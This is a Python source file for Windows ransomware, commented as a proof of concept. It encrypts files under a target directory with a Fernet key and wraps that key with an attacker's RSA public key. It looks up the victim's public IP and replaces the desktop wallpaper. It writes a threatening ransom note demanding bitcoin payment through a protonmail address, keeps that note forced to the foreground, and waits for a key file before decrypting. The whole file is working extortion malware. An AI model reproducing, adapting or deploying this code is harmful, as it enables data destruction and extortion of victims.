from cryptography.fernet import Fernet  # Encrypt/decrypt files on target system.
import os  # Get system root.
import webbrowser  # Visit specific websites.
import ctypes  # Interact with Windows .dll files and change windows wallpaper.
import urllib.request  # Download and save wallpaper.
import requests  # Make GET requests to api.ipify.org to get target machine IP address.
import time  # Sleep interval for ransom note, check desktop to decrypt system and files.
import datetime  # Give time limit on ransom note.
import subprocess  # Create process for notepad and open ransom note.
import win32gui  # Get window text to see if ransom note is on top of all other windows.
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading  # Create ransom note and decryption key on desktop.


class RansomWare:
    # File extensions to encrypt.
    file_exts = [
        # 'png',
        'txt'
    ]

    def __init__(self):
        # Key that will be used for Fernet object and encryption/decryption method.
        self.key = None
        # Encrypter/Decrypter.
        self.crypter = None
        # RSA public key used for encrypting/decrypting Fernet object, for example, Symmetric key.
        self.public_key = None

        '''
        Root directories to start Encryption/Decryption from.
        CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system.
        CAUTION: Create a separate test root directory to see how this software works.
        CAUTION: For example, use 'localRoot' and create some directories and files inside.
        '''
        # Use sysroot to create absolute path and encrypt the whole system.
        self.sysRoot = os.path.expanduser('~')
        # Use localroot to test encryption software for absolute path and encrypt the test system.
        self.localRoot = r''  # DEBUG

        # Get public IP of victim.
        self.publicIP = requests.get('https://api.ipify.org').text

    # Generate a [SYMMETRIC KEY] on victims machine, which is used to encrypt the data.
    def generate_key(self):
        # Generate a URL safe (base64 encoded) key.
        self.key = Fernet.generate_key()
        # Create a Fernet object with encryption/decryption methods.
        self.crypter = Fernet(self.key)

    # Write the Fernet (symmetric key) to text file.
    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)

    # Encrypt the [SYMMETRIC KEY] that was created on the victims machine, to encrypt/decrypt files with our PUBLIC ASYMMETRIC
    # RSA key that was created on our machine. We will later be able to decrypt the [SYMMETRIC KEY] used for
    # encryption/decryption of files on the target machine with our PRIVATE KEY, so that they can then decrypt files.
    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            # Public RSA key.
            self.public_key = RSA.import_key(open('public.pem').read())
            # Public encrypter object.
            public_crypter = PKCS1_OAEP.new(self.public_key)
            # Encrypted Fernet key.
            enc_fernet_key = public_crypter.encrypt(fernet_key)
            # Write encrypted Fernet key to file.
            f.write(enc_fernet_key)
        # Write encrypted Fernet key to desktop, so that the victim can send this file to be unencrypted and get the files back.
        with open(f'{self.sysRoot}/Desktop/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernet_key)
        # Assign self.key to encrypted Fernet key.
        self.key = enc_fernet_key
        # Remove Fernet crypter object.
        self.crypter = None

    # [SYMMETRIC KEY] Fernet encrypt/decrypt file.
    def crypt_file(self, file_path: str, encrypted=False):
        with open(file_path, 'rb') as f:
            # Read data from file.
            data = f.read()
            if not encrypted:
                # Print file contents.
                print(data)  # DEBUG
                # Encrypt data from file.
                _data = self.crypter.encrypt(data)
                # Log that the file is encrypted and print encrypted contents.
                print('> File encrypted')  # DEBUG
                print(_data)  # DEBUG
            else:
                # Decrypt data from file.
                _data = self.crypter.decrypt(data)
                # Log that the file is decrypted and print decrypted contents.
                print('> File decrypted')  # DEBUG
                print(_data)  # DEBUG
        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to file using same filename to overwrite original file.
            fp.write(_data)

    # [SYMMETRIC KEY] Fernet encrypt/decrypt system files using the symmetric key that was generated on victims machine.
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)

    @staticmethod
    def what_is_bitcion():
        url = 'https://bitcoin.org'
        webbrowser.open(url)

    def change_desktop_background(self):
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        # Go to a specific URL, download and save image using the absolute path.
        path = f'{self.sysRoot}/Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access Windows .dll files to change desktop wallpaper.
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
The hard disks of your computer have been encrypted with a Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files.

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt found on {self.sysRoot}/Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com

2. You will receive your personal BTC address for payment.
   Once the payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if the payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files.
   IMPORTANT: To decrypt your files, place the text file on your desktop and wait. Shortly it will begin to decrypt all the files.

WARNING:
Do NOT attempt to decrypt your files, change file names, or run decryption software, as there is a high chance that you will lose your files forever.
Do NOT send "PAID" email without paying, price WILL go up for disobedience.
If the payment is not made on time, the decryption key will be deleted and you won't be able to unlock your files.
''')

    def show_ransom_note(self):
        # Open the ransom note.
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0  # DEBUG
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing')  # DEBUG
                pass
            else:
                print('Ransom note is not the top window - kill/create process again')  # DEBUG
                # Kill the ransom note process so we can open it again and make sure it is in the foreground.
                time.sleep(0.1)
                ransom.kill()
                # Open the ransom note.
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            # Sleep for 10 seconds.
            time.sleep(10)
            count += 1
            if count == 5:
                break

    # Decrypt the system when text file with un-encrypted key in it is placed on the desktop of target machine.
    def put_me_on_desktop(self):
        # Loop to scan for file, if it is found, read the key and then self.key + self.crypter will be valid for decrypting the files.
        print('started')  # DEBUG
        while True:
            try:
                print('trying')  # DEBUG
                # The ATTACKER decrypts the Fernet symmetric key on their machine and then puts the un-encrypted Fernet-
                # -key in this file and sends it in a email to the victim. They then put this on the desktop and it will be-
                # -used to un-encrypt the system. WE DO NOT GIVE THEM THE PRIVATE ASSYEMTRIC KEY.
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    # Decrypt the system once the file is found and we have the crypter with the correct key.
                    self.crypt_system(encrypted=True)
                    print('decrypted')  # DEBUG
                    break
            except Exception as e:
                print(e)  # DEBUG
                pass
            # Scan the desktop for the file every 10 seconds.
            time.sleep(10)  # DEBUG
            print('Checking for PUT_ME_ON_DESKTOP.txt')  # DEBUG
            # 10 seconds is just proof of concept. Real example: Sleep ~ 3 mins
            # secs = 60
            # mins = 3
            # time.sleep((mins * secs))


def main():
    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcion()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> RansomWare: Attack on target machine completed and the system is now encrypted.')  # DEBUG
    print('> RansomWare: Waiting for attacker to give the target machine a document that will un-encrypt the machine.')  # DEBUG
    t2.start()
    print('> RansomWare: Target machine has been un-encrypted.')  # DEBUG
    print('> RansomWare: Completed.')  # DEBUG


if __name__ == '__main__':
    main()
